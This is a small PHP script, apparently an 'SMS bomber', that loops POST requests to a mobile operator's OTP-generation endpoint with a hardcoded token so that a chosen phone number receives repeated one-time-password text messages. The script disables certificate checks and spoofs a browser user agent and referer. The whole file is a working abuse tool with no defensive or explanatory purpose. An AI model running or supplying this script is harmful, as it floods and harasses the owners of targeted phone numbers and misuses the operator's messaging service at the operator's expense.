<?php
function threebomb($no, $jum, $wait = 0){
    $x = 1;
    $result = "";
    while($x <= $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://registrasi.tri.co.id/ulang/generateOTP");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"token=dci0aC3VF9F4pEwKSWtGtNT5UY3wqOlE&msisdn=".$no);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'https://registrasi.tri.co.id/ulang');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
		$json = json_decode($server_output);
		if($json->code == "200" && $json->status == "success"){
			$result .= $x.". Success send sms to ".$json->MSISDN." ✔<br>";
		} else {
			$result .= "✘ FAIL<br>";
		}
		if($wait != 0){
		    sleep($wait);
		}
        $x++;
    }
	return($result);
}
$execute = threebomb('628xxxxxxxxxxx', '2');
print $execute;
?>
